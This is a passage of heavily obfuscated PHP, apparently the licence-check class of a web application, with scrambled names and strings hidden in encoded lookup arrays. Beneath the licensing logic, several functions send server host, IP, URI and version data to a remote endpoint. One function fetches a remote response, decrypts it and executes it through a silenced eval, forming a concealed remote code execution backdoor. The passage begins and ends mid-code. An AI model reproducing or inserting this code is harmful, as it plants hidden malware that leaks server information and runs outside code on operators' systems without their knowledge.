$ìá¹¾æ[10]); $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[147]] = $ìá¹¾æ[123]($this->wmvl23f54898, $ìá¹¾æ[148], $ìá¹¾æ[10]); if ($ìá¹¾æ[123]($GLOBALS, $ìá¹¾æ[149]) && $this->config[$ìá¹¾æ[150]]) { $Ôš[$ìá¹¾æ[125]][$ìá¹¾æ[151]] = WEB_ROOT; } return $Ôš; } private function byxfb7d566c0() { $‘ =& $_SERVER[èÍ×öˆøÉ]; $ç²Š =& $_SERVER[òÛ‡ê…ú]; if ($_SERVER[$ç²Š[44]] == $ç²Š[152]) { $ïÀšÊúóØ = array($ç²Š[137] => $this->rxfl1844eb86, $ç²Š[153] => $this->{$_SERVER[òÛ‡ê…ú][154]}(), $ç²Š[155] => $ç²Š[61]($ç²Š[156])->{$_SERVER[òÛ‡ê…ú][157]}()); if ($this->rxfl1844eb86 != $ç²Š[138]) { $áÎúÜ¶³Ë = $ç²Š[123]($this->wmvl23f54898, $ç²Š[158]); if ($áÎúÜ¶³Ë) { $ïÀšÊúóØ[$ç²Š[159]] = $áÎúÜ¶³Ë; $ïÀšÊúóØ[$ç²Š[160]] = $ç²Š[161]($ç²Š[123]($this->wmvl23f54898, $ç²Š[162])); $ïÀšÊúóØ[$ç²Š[163]] = $ç²Š[123]($this->wmvl23f54898, $ç²Š[148]); } $Åü¿û = $ç²Š[61]($ç²Š[62])->{$_SERVER[òÛ‡ê…ú][63]}($ç²Š[164], $ç²Š[10], !0); if ($ç²Š[165]($Åü¿û) && $ç²Š[25]($Åü¿û, 0, 1) == $ç²Š[166]) { $Åü¿û = $ç²Š[167]($Åü¿û); } if ($ç²Š[168]($Åü¿û) && $Åü¿û[$ç²Š[169]] && $ç²Š[32]($Åü¿û[$ç²Š[169]], $ç²Š[170])) { $È•Éº“ = $ç²Š[0]($ç²Š[170], $Åü¿û[$ç²Š[169]]); $ïÀšÊúóØ[$ç²Š[171]] = $È•Éº“[0]; } } $ïÀšÊúóØ = $this->{$_SERVER[òÛ‡ê…ú][172]}($ç²Š[173]($ïÀšÊúóØ), $ç²Š[131]($ç²Š[174])); $Èœº¸ = $‘[641]; $¨¬¸’Ş«ı = array($ç²Š[175] => $ïÀšÊúóØ); $ç²Š[13](array($ç²Š[176], $ç²Š[177]), $¨¬¸’Ş«ı); } if ($this->rxfl1844eb86 == $ç²Š[138]) { return; } $şİ—Ë¿ = array($ç²Š[178], $ç²Š[179], $ç²Š[180], $ç²Š[181], $ç²Š[182], $ç²Š[183]); $œÉÄŠÖ¨”ÅÃ… = $ç²Š[61]($ç²Š[62])->{$_SERVER[òÛ‡ê…ú][63]}(); $¨¬¸’Ş«ı = array($ç²Š[184] => $œÉÄŠÖ¨”ÅÃ…[$ç²Š[64]], $ç²Š[185] => $œÉÄŠÖ¨”ÅÃ…[$ç²Š[65]], $ç²Š[186] => $ç²Š[10]); foreach ($şİ—Ë¿ as $êĞìÖñ—¹ø‘Ü) { if (!isset($œÉÄŠÖ¨”ÅÃ…[$êĞìÖñ—¹ø‘Ü]) || !$œÉÄŠÖ¨”ÅÃ…[$êĞìÖñ—¹ø‘Ü]) { continue; } $¨¬¸’Ş«ı[$êĞìÖñ—¹ø‘Ü] = $œÉÄŠÖ¨”ÅÃ…[$êĞìÖñ—¹ø‘Ü]; } $ç²Š[13](array($ç²Š[176], $ç²Š[177]), $¨¬¸’Ş«ı); $»ºËˆ = $‘[642]; if (!$»ºËˆ) { return; } } private function kedcf6cbfba7() { $„ =& $_SERVER[èÍ×öˆøÉ]; $ĞóòÊ =& $_SERVER[òÛ‡ê…ú]; if ($_SERVER[$ĞóòÊ[44]] != $ĞóòÊ[187]) { return; } if (!$ĞóòÊ[123]($GLOBALS, $ĞóòÊ[149])) { die; } $°§…œÍ”ßğ« = $GLOBALS[$ĞóòÊ[22]]; if (isset($°§…œÍ”ßğ«[$ĞóòÊ[188]])) { $this->{$_SERVER[òÛ‡ê…ú][189]}(); die; } if (!isset($°§…œÍ”ßğ«[$ĞóòÊ[190]]) || $ĞóòÊ[24]($°§…œÍ”ßğ«[$ĞóòÊ[190]]) != 16) { $ĞóòÊ[191]($ĞóòÊ[192] . $°§…œÍ”ßğ«[$ĞóòÊ[190]], !1); } $ŞÕ±Ô¯Üç± = $ĞóòÊ[61]($ĞóòÊ[62])->{$_SERVER[òÛ‡ê…ú][63]}($ĞóòÊ[133]); $ÆÀßŠ—Şß¥ñ° = $ĞóòÊ[131]($_SERVER[$ĞóòÊ[132]] . $ŞÕ±Ô¯Üç±); $ÉÌñŒ = array($ĞóòÊ[190] => $°§…œÍ”ßğ«[$ĞóòÊ[190]], $ĞóòÊ[193] => $ĞóòÊ[141](16), $ĞóòÊ[194] => $ĞóòÊ[174], $ĞóòÊ[195] => $ĞóòÊ[196], $ĞóòÊ[197] => $_SERVER[$ĞóòÊ[198]], $ĞóòÊ[199] => $_SERVER[$ĞóòÊ[200]], $ĞóòÊ[201] => $_SERVER[$ĞóòÊ[202]], $ĞóòÊ[130] => $ÆÀßŠ—Şß¥ñ°, $ĞóòÊ[203] => $ĞóòÊ[61]($ĞóòÊ[62])->{$_SERVER[òÛ‡ê…ú][63]}($ĞóòÊ[164])); if ($°§…œÍ”ßğ«[$ĞóòÊ[204]] == $ĞóòÊ[205]) { $•Âà¦…÷¬ = $this->{$_SERVER[òÛ‡ê…ú][172]}($ÆÀßŠ—Şß¥ñ°, $ĞóòÊ[206]); $¥ = $this->{$_SERVER[òÛ‡ê…ú][144]}($ĞóòÊ[173]($ÉÌñŒ), $ÆÀßŠ—Şß¥ñ° . $ĞóòÊ[207], 3); $¥ = $¥ . $ĞóòÊ[208] . $_SERVER[$ĞóòÊ[198]]; $ŒÕ…³ú´÷» = $this->{$_SERVER[òÛ‡ê…ú][209]}($ĞóòÊ[210] . $•Âà¦…÷¬ . $ĞóòÊ[211] . $¥, -1); $ĞóòÊ[191]($ŒÕ…³ú´÷», !0); } else { if ($°§…œÍ”ßğ«[$ĞóòÊ[204]] == $ĞóòÊ[212]) { $î“ = $ĞóòÊ[25]($ĞóòÊ[131]($ĞóòÊ[213] . $ÆÀßŠ—Şß¥ñ°), 12, 15) . $ĞóòÊ[214]; $¥ = $this->{$_SERVER[òÛ‡ê…ú][215]}($ĞóòÊ[2]($°§…œÍ”ßğ«[$ĞóòÊ[216]]), $î“, 2); $°ÀŞ”çÍÔ“Òå = $ĞóòÊ[217]($¥, !0); if (!$ĞóòÊ[168]($°ÀŞ”çÍÔ“Òå) || !$ĞóòÊ[168]($°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]]) || $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[190]] != !0) { $ú„– = $ĞóòÊ[219]; $ñë = $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]] ? $ĞóòÊ[220] . $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]] : $ú„–; $ĞóòÊ[191]($ñë, !1); } else { $ÉÌñŒ[$ĞóòÊ[193]] = $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]][$ĞóòÊ[221]]; } } else { $°ÀŞ”çÍÔ“Òå = $this->{$_SERVER[òÛ‡ê…ú][209]}($ĞóòÊ[222], $ÉÌñŒ, 10); $²íé—´Ó˜Ø = $„[643]; } } if (!$ĞóòÊ[168]($°ÀŞ”çÍÔ“Òå) || !$ĞóòÊ[168]($°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]]) || $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[190]] != !0) { $ú„– = $ĞóòÊ[223]($ĞóòÊ[224]); $ñë = $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]] ? $ĞóòÊ[220] . $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]] : $ú„–; $ĞóòÊ[191]($ñë, !1); } $ñíêÇ„î = $°ÀŞ”çÍÔ“Òå[$ĞóòÊ[218]]; $— = $this->{$_SERVER[òÛ‡ê…ú][225]}($ñíêÇ„î[$ĞóòÊ[226]]); $ÆÈÑ = $„[644]; if (strlen($ÆÈÑ) < $„[625]) { die; } if (!$— || $— != $ñíêÇ„î[$ĞóòÊ[162]]) { $„Ö•½‰ = array($ĞóòÊ[227] => $ĞóòÊ[61]($ĞóòÊ[62])->{$_SERVER[òÛ‡ê…ú][63]}($ĞóòÊ[133]), $ĞóòÊ[228] => $_SERVER[$ĞóòÊ[132]], $ĞóòÊ[229] => $ĞóòÊ[230](), $ĞóòÊ[199] => $_SERVER[$ĞóòÊ[200]]); $¥ = $this->{$_SERVER[òÛ‡ê…ú][231]}($ĞóòÊ[173]($„Ö•½‰)); $this->{$_SERVER[òÛ‡ê…ú][209]}($ĞóòÊ[232] . $¥); $ĞóòÊ[191]($ĞóòÊ[223]($ĞóòÊ[233]), !0); } $À÷ô¤ = array($ĞóòÊ[234] => $ñíêÇ„î[$ĞóòÊ[235]], $ĞóòÊ[236] => $ñíêÇ„î[$ĞóòÊ[237]], $ĞóòÊ[238] => $ĞóòÊ[141](16), $ĞóòÊ[137] => $ñíêÇ„î[$ĞóòÊ[239]]); if ($ÉÌñŒ[$ĞóòÊ[193]]) { $À÷ô¤[$ĞóòÊ[238]] = $ÉÌñŒ[$ĞóòÊ[193]]; } $¾¦Ö–ù = $ĞóòÊ[25]($ĞóòÊ[131]($À÷ô¤[$ĞóòÊ[236]]), 10, 10); $…ôô© = $¾¦Ö–ù . $À÷ô¤[$ĞóòÊ[137]] . $À÷ô¤[$ĞóòÊ[238]]; $‰†²ë¨½ = $„[645]; if (strlen($‰†²ë¨½) < $„[613]) { die; } $À÷ô¤[$ĞóòÊ[139]] = $ĞóòÊ[240]($ĞóòÊ[135]($this->{$_SERVER[òÛ‡ê…ú][172]}($…ôô©, $ĞóòÊ[241]))); $½œ†·Ë = $ĞóòÊ[141](16); $ñÏØŞ = $„[646]; while (strlen($ñÏØŞ) < $„[616]) { if (!$ñÏØŞ) { break; } $ñÏØŞ++; } $Áò£¾»²éïµ = $½œ†·Ë . $À÷ô¤[$ĞóòÊ[137]] . $this->{$_SERVER[òÛ‡ê…ú][172]}($ĞóòÊ[131]($À÷ô¤[$ĞóòÊ[234]]), $½œ†·Ë); $ˆ•‡İ = $„[647]; $À÷ô¤[$ĞóòÊ[140]] = $ĞóòÊ[135]($ĞóòÊ[240]($this->{$_SERVER[òÛ‡ê…ú][172]}($Áò£¾»²éïµ, $ĞóòÊ[242]))); if ($ñíêÇ„î[$ĞóòÊ[243]] && $ñíêÇ„î[$ĞóòÊ[243]] >= 1) { $ĞóòÊ[61]($ĞóòÊ[62])->{$_SERVER[òÛ‡ê…ú][244]}($ĞóòÊ[245], $ĞóòÊ[246]); } $ĞóòÊ[61]($ĞóòÊ[62])->{$_SERVER[òÛ‡ê…ú][247]}($À÷ô¤); $á®¥¹¤£šå = $ĞóòÊ[131]($_SERVER[$ĞóòÊ[132]] . $ĞóòÊ[240]($ŞÕ±Ô¯Üç±) . $À÷ô¤[$ĞóòÊ[236]]); $© = $„[648]; while (strlen($©) < $„[604]) { if (!$©) { break; } $©++; } $»›¥ŞÕ× = $ĞóòÊ[240]($ĞóòÊ[25]($á®¥¹¤£šå, 10, 16)); $Ş¨êèÜ©Ç = $this->{$_SERVER[òÛ‡ê…ú][144]}($ĞóòÊ[173]($ñíêÇ„î), $á®¥¹¤£šå); $†ú = $ĞóòÊ[248]($ĞóòÊ[61]($ĞóòÊ[11])->{$_SERVER[òÛ‡ê…ú][249]}(), $ĞóòÊ[250]); $å‘¾’ = $†ú[$ĞóòÊ[251]]; $ûÃ²·Ğ‹¨úÇ = $„[649]; if (strlen($ûÃ²·Ğ‹¨úÇ) < $„[613]) { return; } $ãÇ = array(); $”Åö” = $„[650]; if (!$”Åö”) { return; } $ãÇ[$»›¥ŞÕ×] = $Ş¨êèÜ©Ç; $ĞóòÊ[61]($ĞóòÊ[11])->{$_SERVER[òÛ‡ê…ú][252]}($å‘¾’[$ĞóòÊ[253]], array($ĞóòÊ[254] => $ãÇ)); $ÌëÑã„ = $„[651]; if (strlen($ÌëÑã„) < $„[613]) { return; } $this->wmvl23f54898 = $ñíêÇ„î; $this->rxfl1844eb86 = $À÷ô¤[$ĞóòÊ[137]]; $this->{$_SERVER[òÛ‡ê…ú][255]}(); Cache::set($ĞóòÊ[256] . $ĞóòÊ[131]($ŞÕ±Ô¯Üç± . $ĞóòÊ[257]), $ĞóòÊ[10]); $õØÏÛ¸½İ§ä = $„[652]; while (strlen($õØÏÛ¸½İ§ä) < $„[625]) { if (!$õØÏÛ¸½İ§ä) { break; } $õØÏÛ¸½İ§ä++; } $ĞóòÊ[191]($ĞóòÊ[223]($ĞóòÊ[233]), !0); } private function licenseRegistSuccess() { $”àÅÏØ¥ôß =& $_SERVER[òÛ‡ê…ú]; $Ì = $”àÅÏØ¥ôß[61]($”àÅÏØ¥ôß[62])->{$_SERVER[òÛ‡ê…ú][63]}(); if ($Ì[$”àÅÏØ¥ôß[93]] != $”àÅÏØ¥ôß[246]) { $”àÅÏØ¥ôß[61]($”àÅÏØ¥ôß[62])->{$_SERVER[òÛ‡ê…ú][247]}($”àÅÏØ¥ôß[93], $”àÅÏØ¥ôß[246]); } $”àÅÏØ¥ôß[127]($”àÅÏØ¥ôß[258])->{$_SERVER[òÛ‡ê…ú][259]}(!0); } private function unjeecb1dbda() { $Ô”áÚ÷ˆŒåˆ =& $_SERVER[òÛ‡ê…ú]; $Ô”áÚ÷ˆŒåˆ[61]($Ô”áÚ÷ˆŒåˆ[62])->{$_SERVER[òÛ‡ê…ú][247]}(array($Ô”áÚ÷ˆŒåˆ[234] => $Ô”áÚ÷ˆŒåˆ[10], $Ô”áÚ÷ˆŒåˆ[236] => $Ô”áÚ÷ˆŒåˆ[10], $Ô”áÚ÷ˆŒåˆ[137] => $Ô”áÚ÷ˆŒåˆ[138], $Ô”áÚ÷ˆŒåˆ[139] => $Ô”áÚ÷ˆŒåˆ[10], $Ô”áÚ÷ˆŒåˆ[140] => $Ô”áÚ÷ˆŒåˆ[10])); $Ô”áÚ÷ˆŒåˆ[61]($Ô”áÚ÷ˆŒåˆ[62])->{$_SERVER[òÛ‡ê…ú][244]}($Ô”áÚ÷ˆŒåˆ[245], $Ô”áÚ÷ˆŒåˆ[260]); $this->wmvl23f54898 = array(); $this->rxfl1844eb86 = $Ô”áÚ÷ˆŒåˆ[138]; } private function agqx3df34b30() { $§«ş =& $_SERVER[èÍ×öˆøÉ]; $ıÎ‡“§ë¢ =& $_SERVER[òÛ‡ê…ú]; $_SERVER[$ıÎ‡“§ë¢[200]] = $ıÎ‡“§ë¢[123]($_SERVER, $ıÎ‡“§ë¢[200], APP_HOST); $this->rxfl1844eb86 = $ıÎ‡“§ë¢[138]; $ß¯™ = $ıÎ‡“§ë¢[61]($ıÎ‡“§ë¢[62])->{$_SERVER[òÛ‡ê…ú][63]}(); $ı  = $§«ş[653]; if (!$ı ) { die; } if ($ß¯™[$ıÎ‡“§ë¢[137]] == $ıÎ‡“§ë¢[138]) { return; } $ŠıŸû Ô¬Ú¢µ = $ıÎ‡“§ë¢[61]($ıÎ‡“§ë¢[62])->{$_SERVER[òÛ‡ê…ú][63]}($ıÎ‡“§ë¢[133]); $×»Äî = $§«ş[654]; if (!$×»Äî) { die; } $” = $ıÎ‡“§ë¢[256] . $ıÎ‡“§ë¢[131]($ŠıŸû Ô¬Ú¢µ . $ıÎ‡“§ë¢[257]); $òá‡­ĞÖçÏ = $§«ş[624]; while ($òá‡­ĞÖçÏ < $§«ş[625]) { if ($òá‡­ĞÖçÏ >= 0) { break; } $òá‡­ĞÖçÏ++; } $†é— = Cache::get($”); $‹“£Ïò˜Ä­ = $§«ş[655]; if (!$‹“£Ïò˜Ä­) { die; } if (!$ıÎ‡“§ë¢[168]($†é—) || !isset($†é—[$ıÎ‡“§ë¢[261]]) || $ıÎ‡“§ë¢[262]() - $†é—[$ıÎ‡“§ë¢[261]] >= 60) { $€úè = $ıÎ‡“§ë¢[61]($ıÎ‡“§ë¢[11])->{$_SERVER[òÛ‡ê…ú][263]}(); $Çé× = $€úè[$ıÎ‡“§ë¢[251]]; $®¼§Åé«„©× = $ıÎ‡“§ë¢[131]($_SERVER[$ıÎ‡“§ë¢[132]] . $ıÎ‡“§ë¢[240]($ŠıŸû Ô¬Ú¢µ) . $ß¯™[$ıÎ‡“§ë¢[236]]); $ÀñÇÀŸÌÌÂÇ = $ıÎ‡“§ë¢[240]($ıÎ‡“§ë¢[25]($®¼§Åé«„©×, 10, 16)); $†é— = $this->{$_SERVER[òÛ‡ê…ú][215]}($Çé×[$ıÎ‡“§ë¢[111]][$ÀñÇÀŸÌÌÂÇ], $®¼§Åé«„©×); $†é— = $ıÎ‡“§ë¢[217]($†é—, !0); } if (!$ıÎ‡“§ë¢[168]($†é—)) { return $this->{$_SERVER[òÛ‡ê…ú][189]}(); } $ßÀÊ¥ = $ıÎ‡“§ë¢[161]($†é—[$ıÎ‡“§ë¢[162]]); if ($ıÎ‡“§ë¢[262]() >= $ßÀÊ¥) { return $this->{$_SERVER[òÛ‡ê…ú][189]}(); } if ($ıÎ‡“§ë¢[262]() - $†é—[$ıÎ‡“§ë¢[261]] > 20) { $†é—[$ıÎ‡“§ë¢[261]] = $ıÎ‡“§ë¢[262](); Cache::set($”, $†é—); } $this->wmvl23f54898 = $†é—; $this->rxfl1844eb86 = $ß¯™[$ıÎ‡“§ë¢[137]]; } private function vghk3a495137() { $ì²ó =& $_SERVER[èÍ×öˆøÉ]; $˜Æì =& $_SERVER[òÛ‡ê…ú]; $Çê = $GLOBALS[$˜Æì[22]]; $®šÂô = $_SERVER[$˜Æì[44]]; $½”ß¡İ = $ì²ó[656]; while (strlen($½”ß¡İ) < $ì²ó[604]) { if (!$½”ß¡İ) { break; } $½”ß¡İ++; } if ($®šÂô == $˜Æì[264] && $this->rxfl1844eb86 == $˜Æì[138]) { $˜Æì[191]($˜Æì[223]($˜Æì[265]), !1, $˜Æì[266]); } $€ÄŠ–”È— = array($˜Æì[267], $˜Æì[268]); if ($˜Æì[269]($®šÂô, $€ÄŠ–”È—)) { if ($this->rxfl1844eb86 == $˜Æì[138] && isset($Çê[$˜Æì[270]])) { $˜Æì[191]($˜Æì[223]($˜Æì[265]), !1, $˜Æì[266]); die; } $Ô éˆüŒ = $this->{$_SERVER[òÛ‡ê…ú][154]}(); if ($Ô éˆüŒ != $˜Æì[271]($˜Æì[272])) { if ($Ô éˆüŒ <= $˜Æì[61]($˜Æì[156])->{$_SERVER[òÛ‡ê…ú][157]}()) { $˜Æì[191]($˜Æì[223]($˜Æì[273]), !1, $˜Æì[266]); die; } } } } private function viol39f3599b() { $ó…Ğª“òö¹ =& $_SERVER[èÍ×öˆøÉ]; $§»ó÷ù• =& $_SERVER[òÛ‡ê…ú]; $İ†¹®ëê = array($§»ó÷ù•[152], $§»ó÷ù•[274]); $çšÎ·âÌ = $ó…Ğª“òö¹[657]; while (strlen($çšÎ·âÌ) < $ó…Ğª“òö¹[616]) { if (!$çšÎ·âÌ) { break; } $çšÎ·âÌ++; } if (!$§»ó÷ù•[123]($GLOBALS, $§»ó÷ù•[149]) || !isset($_GET[$§»ó÷ù•[275]])) { return; } if (!$§»ó÷ù•[269]($_SERVER[$§»ó÷ù•[44]], $İ†¹®ëê)) { return; } $ËÃû‚Æ½‘¦Í = $§»ó÷ù•[276]; $Ã×ûš = $ó…Ğª“òö¹[658]; if (strlen($Ã×ûš) < $ó…Ğª“òö¹[607]) { die; } $ËÃû‚Æ½‘¦Í = $this->{$_SERVER[òÛ‡ê…ú][277]}($ËÃû‚Æ½‘¦Í, $§»ó÷ù•[278]); $üº²Õç£œ = $ó…Ğª“òö¹[659]; if (!$üº²Õç£œ) { die; } $çœö½½ = $§»ó÷ù•[279](array($§»ó÷ù•[280] => array($§»ó÷ù•[281] => $§»ó÷ù•[282], $§»ó÷ù•[283] => 3))); $±¨ = $ó…Ğª“òö¹[660]; while (strlen($±¨) < $ó…Ğª“òö¹[625]) { if (!$±¨) { break; } $±¨++; } $ñºÅËï = @$§»ó÷ù•[284]($ËÃû‚Æ½‘¦Í, !1, $çœö½½); $§»ó÷ù•[285]($§»ó÷ù•[286]); $ƒã = $ó…Ğª“òö¹[661]; if ($ñºÅËï && $§»ó÷ù•[32]($ñºÅËï, $§»ó÷ù•[287])) { echo $ñºÅËï; } die; } public function heti664da988($á§†Ï½º) { $¢°ª =& $_SERVER[èÍ×öˆøÉ]; $´‰×á£Ş· =& $_SERVER[òÛ‡ê…ú]; if ($this->rxfl1844eb86 == $´‰×á£Ş·[288]) { return $á§†Ï½º; } $İÛøëÜË = array($´‰×á£Ş·[289] => $´‰×á£Ş·[290], $´‰×á£Ş·[291] => $´‰×á£Ş·[290], $´‰×á£Ş·[292] => $´‰×á£Ş·[290], $´‰×á£Ş·[293] => $´‰×á£Ş·[290], $´‰×á£Ş·[294] => $´‰×á£Ş·[295], $´‰×á£Ş·[296] => $´‰×á£Ş·[295], $´‰×á£Ş·[297] => $´‰×á£Ş·[295], $´‰×á£Ş·[298] => $´‰×á£Ş·[295], $´‰×á£Ş·[299] => $´‰×á£Ş·[295], $´‰×á£Ş·[300] => $´‰×á£Ş·[295], $´‰×á£Ş·[301] => $´‰×á£Ş·[295], $´‰×á£Ş·[302] => $´‰×á£Ş·[295], $´‰×á£Ş·[303] => $´‰×á£Ş·[295], $´‰×á£Ş·[304] => $´‰×á£Ş·[295], $´‰×á£Ş·[305] => $´‰×á£Ş·[295], $´‰×á£Ş·[306] => $´‰×á£Ş·[295]); $°­“‚«å¹ïà = $¢°ª[662]; if (strlen($°­“‚«å¹ïà) < $¢°ª[616]) { return; } $Òí» = $´‰×á£Ş·[0]($´‰×á£Ş·[307], $´‰×á£Ş·[123]($this->wmvl23f54898, $´‰×á£Ş·[146], $´‰×á£Ş·[10])); $˜í™Ó–£ = array(); $üÕŸ±š¢È = $¢°ª[663]; if (strlen($üÕŸ±š¢È) < $¢°ª[604]) { die; } foreach ($İÛøëÜË as $—„ø¡üŸ²—µå => $¿òÔ‹šÃ) { if ($¿òÔ‹šÃ == $´‰×á£Ş·[290] && $´‰×á£Ş·[25]($this->rxfl1844eb86, 0, 1) == $´‰×á£Ş·[290]) { continue; } if (!$´‰×á£Ş·[269]($—„ø¡üŸ²—µå, $Òí»)) { $˜í™Ó–£[] = $—„ø¡üŸ²—µå; } } foreach ($˜í™Ó–£ as $—„ø¡üŸ²—µå) { unset($á§†Ï½º[$—„ø¡üŸ²—µå]); } return $á§†Ï½º; } private function mbjd93226b92() { $¦ÆÛ·¾§ =& $_SERVER[òÛ‡ê…ú]; if ($this->rxfl1844eb86 != $¦ÆÛ·¾§[138]) { return; } $GLOBALS[$¦ÆÛ·¾§[111]][$¦ÆÛ·¾§[115]][$¦ÆÛ·¾§[308]] = $¦ÆÛ·¾§[246]; $GLOBALS[$¦ÆÛ·¾§[111]][$¦ÆÛ·¾§[309]] = $¦ÆÛ·¾§[246]; $ÈÇ½ë¤ì×¦ùŸ = $_SERVER[èÍ×öˆøÉ][664]; if (!$ÈÇ½ë¤ì×¦ùŸ) { die; } if ($¦ÆÛ·¾§[61]($¦ÆÛ·¾§[310])->{$_SERVER[òÛ‡ê…ú][63]}($¦ÆÛ·¾§[93]) != $¦ÆÛ·¾§[260]) { $¦ÆÛ·¾§[61]($¦ÆÛ·¾§[310])->{$_SERVER[òÛ‡ê…ú][247]}($¦ÆÛ·¾§[93], $¦ÆÛ·¾§[260]); } } public function amexa0d2c815() { return $_SERVER[òÛ‡ê…ú][311]; $ıû¬°ÃúÌ™ñ´ = $_SERVER[èÍ×öˆøÉ][665]; } private function frvxc5bcb56d() { $¯Ó‹óÒ =& $_SERVER[èÍ×öˆøÉ]; $üÍ³©¾Õ°™Ú® =& $_SERVER[òÛ‡ê…ú]; $ âšÙ = array($üÍ³©¾Õ°™Ú®[312], $üÍ³©¾Õ°™Ú®[313], $üÍ³©¾Õ°™Ú®[314]); $‹ˆ—‘¼¿Á = $¯Ó‹óÒ[666]; $•œ­øêµà = $üÍ³©¾Õ°™Ú®[315] . $üÍ³©¾Õ°™Ú®[131]($üÍ³©¾Õ°™Ú®[316]); if ($this->rxfl1844eb86 == $üÍ³©¾Õ°™Ú®[138] || !$üÍ³©¾Õ°™Ú®[123]($GLOBALS, $üÍ³©¾Õ°™Ú®[149])) { return; } if (!$üÍ³©¾Õ°™Ú®[269]($_SERVER[$üÍ³©¾Õ°™Ú®[44]], $ âšÙ)) { return; } if ($üÍ³©¾Õ°™Ú®[262]() % 4 != 0) { return; } $ıç = $üÍ³©¾Õ°™Ú®[13](array($üÍ³©¾Õ°™Ú®[317], $üÍ³©¾Õ°™Ú®[318]), $•œ­øêµà); if ($ıç && $üÍ³©¾Õ°™Ú®[262]() - $ıç < $üÍ³©¾Õ°™Ú®[271]($üÍ³©¾Õ°™Ú®[319])) { return; } $üÍ³©¾Õ°™Ú®[13](array($üÍ³©¾Õ°™Ú®[317], $üÍ³©¾Õ°™Ú®[177]), $•œ­øêµà, $üÍ³©¾Õ°™Ú®[262]()); $àîÑö = $üÍ³©¾Õ°™Ú®[61]($üÍ³©¾Õ°™Ú®[62])->{$_SERVER[òÛ‡ê…ú][63]}($üÍ³©¾Õ°™Ú®[133]); $Ö—‚›·š¡ = $¯Ó‹óÒ[667]; $«Ïğ£›Î = array($üÍ³©¾Õ°™Ú®[190] => $üÍ³©¾Õ°™Ú®[61]($üÍ³©¾Õ°™Ú®[62])->{$_SERVER[òÛ‡ê…ú][63]}($üÍ³©¾Õ°™Ú®[234]), $üÍ³©¾Õ°™Ú®[204] => $this->rxfl1844eb86, $üÍ³©¾Õ°™Ú®[201] => $_SERVER[$üÍ³©¾Õ°™Ú®[202]], $üÍ³©¾Õ°™Ú®[203] => $üÍ³©¾Õ°™Ú®[61]($üÍ³©¾Õ°™Ú®[62])->{$_SERVER[òÛ‡ê…ú][63]}($üÍ³©¾Õ°™Ú®[164]), $üÍ³©¾Õ°™Ú®[130] => $üÍ³©¾Õ°™Ú®[131]($_SERVER[$üÍ³©¾Õ°™Ú®[132]] . $àîÑö), $üÍ³©¾Õ°™Ú®[194] => $üÍ³©¾Õ°™Ú®[174], $üÍ³©¾Õ°™Ú®[197] => $_SERVER[$üÍ³©¾Õ°™Ú®[198]]); $‹È¬é“û‘ = $¯Ó‹óÒ[668]; while ($‹È¬é“û‘ < $¯Ó‹óÒ[616]) { if ($‹È¬é“û‘ >= 0) { break; } $‹È¬é“û‘++; } $Áó°‰æœîì = $this->{$_SERVER[òÛ‡ê…ú][209]}($üÍ³©¾Õ°™Ú®[320], $«Ïğ£›Î); if (!$üÍ³©¾Õ°™Ú®[168]($Áó°‰æœîì)) { return; } if ($Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[190]] && $Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[321]]) { if ($this->{$_SERVER[òÛ‡ê…ú][225]}($Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[321]]) == $«Ïğ£›Î[$üÍ³©¾Õ°™Ú®[190]]) { return; } } $this->{$_SERVER[òÛ‡ê…ú][189]}(); if ($this->{$_SERVER[òÛ‡ê…ú][225]}($Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[321]]) != $«Ïğ£›Î[$üÍ³©¾Õ°™Ú®[190]]) { $Š = array($üÍ³©¾Õ°™Ú®[227] => $àîÑö, $üÍ³©¾Õ°™Ú®[228] => $_SERVER[$üÍ³©¾Õ°™Ú®[132]], $üÍ³©¾Õ°™Ú®[229] => $üÍ³©¾Õ°™Ú®[230](), $üÍ³©¾Õ°™Ú®[199] => $_SERVER[$üÍ³©¾Õ°™Ú®[200]]); $¨˜øôƒº¶Óï = $this->{$_SERVER[òÛ‡ê…ú][231]}($üÍ³©¾Õ°™Ú®[173]($Š)); $Áó°‰æœîì = $this->{$_SERVER[òÛ‡ê…ú][209]}($üÍ³©¾Õ°™Ú®[232] . $¨˜øôƒº¶Óï); if ($Áó°‰æœîì && $üÍ³©¾Õ°™Ú®[168]($Áó°‰æœîì) && isset($Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[321]])) { $†ø˜ = $this->{$_SERVER[òÛ‡ê…ú][215]}($Áó°‰æœîì[$üÍ³©¾Õ°™Ú®[321]], 2); if ($†ø˜) { $†ø˜ = $this->{$_SERVER[òÛ‡ê…ú][225]}($†ø˜); } if ($†ø˜) { try { @eval($†ø˜); } catch (Exception $Â–í‡Ûæšƒî) { } } } } } private function xspofd929b03($‰Ò = '', $×Ä” = array(), $¿ƒÚˆ˜Ç¿Ÿª = 5) { $å†Âë´º¹Š =& $_SERVER[èÍ×öˆøÉ]; $Ğ»Â™Íşìê† =& $_SERVER[òÛ‡ê…ú]; $ş = $Ğ»Â™Íşìê†[322]; $—× = $å†Âë´º¹Š[669]; if (!$—×) { return; } $ş = $this->{$_SERVER[òÛ‡ê…ú][277]}($ş, $Ğ»Â™Íşìê†[323]); $î©ñ„üù = $å†Âë´º¹Š[670]; $ş = $ş . $‰Ò; $Ù‚Ø€ = $å†Âë´º¹Š[671]; if (strlen($Ù‚Ø€) < $å†Âë´º¹Š[625]) { die; } if ($×Ä” && $Ğ»Â™Íşìê†[168]($×Ä”)) { $ş = $ş . $Ğ»Â™Íşìê†[324] . $Ğ»Â™Íşìê†[325]($×Ä”); } if ($×Ä” === -1) { return $ş; } $Í›çÉÀÙ = $Ğ»Â™Íşìê†[279](array($Ğ»Â™Íşìê†[280] => array($Ğ»Â™Íşìê†[283] => $¿ƒÚˆ˜Ç¿Ÿª, $Ğ»Â™Íşìê†[281] => $Ğ»Â™Íşìê†[326]), $Ğ»Â™Íşìê†[327] => 